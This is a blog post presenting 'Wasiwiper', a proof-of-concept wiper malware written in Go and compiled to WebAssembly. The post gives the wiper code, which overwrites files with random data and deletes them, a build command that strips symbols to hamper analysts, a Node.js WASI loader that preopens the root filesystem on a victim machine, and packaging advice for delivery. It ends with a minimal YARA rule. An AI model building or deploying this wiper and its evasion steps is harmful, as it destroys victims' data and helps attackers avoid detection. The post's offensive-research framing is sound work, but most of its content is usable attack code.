+++
date = '2025-03-31T19:41:01+02:00'
draft = false
title = '🐙 Wasiwiper: WASM for Stealth Offensive Security'
+++

![wasmlogo](https://miro.medium.com/v2/resize:fit:612/1*igmwlOsICf5E1oNVyUZhoQ.png)

Yesterday, I was experimenting with the WASM technology in one of my gazillion side-projects. WASM stands for **WebAssembly** and is a binary instruction format that allows compiling and executing non-browser code in a browser environment. **Think of running C or C++ in your Browser**. I have used this technology for one project that I built using Rust.

Today morning It struck me with it... I had an insaneeee idea. What if we could write native malware using a backend language such as Golang or Rust and let it run in the browser without the os ever noticing that we are running native code in a browser-subprocess. So here am I yet again trying to pitch you another exotic malware method 😂. The plan is to write a primitive wiper that is supposed to use high-level Microsoft OS APIs and simply disk i/o to wipe files and overwrite them effectively using rand data.

## Part 1: Building the malware in the Host Language

For this PoC I will resort to building the wiper in Golang since it is super easy to compile to WASM. Here is the code for now:

```golang
package main

import (
	"crypto/rand"
	"os"
)

func wipe(filePath string) error {
	file, err := os.OpenFile(filePath, os.O_WRONLY, 0644)
	if err != nil {}
	defer file.Close()
	fileInfo, err := file.Stat()
	if err != nil {}
	size := fileInfo.Size()
	randomData := make([]byte, size)
	_, err = rand.Read(randomData)
	if err != nil {}
	_, err = file.WriteAt(randomData, 0)
	if err != nil {}
	file.Sync()
	file.Close()
	return os.Remove(filePath)
}

func main() {
	wipe("somedirectory")
}
```

As you see, this wiper is supeer primitive and will not be usable for a real-life full-scale attack. 

We now need to compile it down to the WASM target using the golang compiler. Parallely I will strip the debug symbols to shrink the resulting binary and make the life of a SOC Analyst harder.

```bash
GOOS=wasip1 GOARCH=wasm go build -o wiper.wasm -ldflags="-s -w"
```

After roughly a second or two, I was left with a neat wiper.wasm file. This is it. This is the bytecode that we technically could directly run using a WASM runtime. What we will do instead is, we will load the wasm file using a custom **NodeJS** script that will run on the victims host machine and which in its own turn will call the exported golang wiper functionality.

## Part 2: NodeJS Client-Side Loader

Here is a simply NodeJS wasm loader. I will facilitate the **WASI Runtime** which allows us to run wasm bytecode.

```javascript
const { WASI } = require('wasi');
const fs = require('fs');

const wasi = new WASI({
  version: 'preview1',
  args: process.argv,
  env: process.env,
  preopens: { '/': '/' } });
const wasmBuffer = fs.readFileSync('./wiper.wasm');

(async () => {
  const { instance } = await WebAssembly.instantiate(wasmBuffer, { wasi_snapshot_preview1: wasi.wasiImport });
  wasi.start(instance);
})();
```

We can run this using the following:

```bash
node loader.js
```

And we see, that it starts wiping out files from dirs where it has access to.

## Part 3: Delivery

Obviously we can not run this without including a NodeJS runtime in the payload. So we will simply package the NodeJS loader into something like [Electron](https://www.electronjs.org/) or [Nexe](https://github.com/nexe/nexe) to produce a standalone binary.

## Concluding

I think WASM malware can be very interesting since the processes will monitored as a browser / nodejs process. Obviously these kind of threats are very rare but still very stealthy since SOC Analysts and XDRs are used to native binary formats on not something like WASM. If additionally to stripping the debug symbols, we would have obfuscated the original golang code, this could add another layer of stealthyness to the wiper.

## Mitigation

I have no fu*cking idea on how you wanna mitigate this. Maybe you can and most likely want to block ElectronJS and NodeJS apps?. Or maybe your XDR can detect WASM binaries that are loaded in-memory. If so, apply these changes now! If not... well fuck. In this case simply use this YARA-Rule to adapt your IPS to.:

```bash
rule Detect_WASM {
    meta:
        description = "Detects potentially malicious WebAssembly (WASM) binaries"
        author = "Timo Sarkar"
        date = "2025-03-31"
        version = "1.0"
    strings:
        $wasm_magic = { 00 61 73 6D }
    condition:
        $wasm_magic
}
```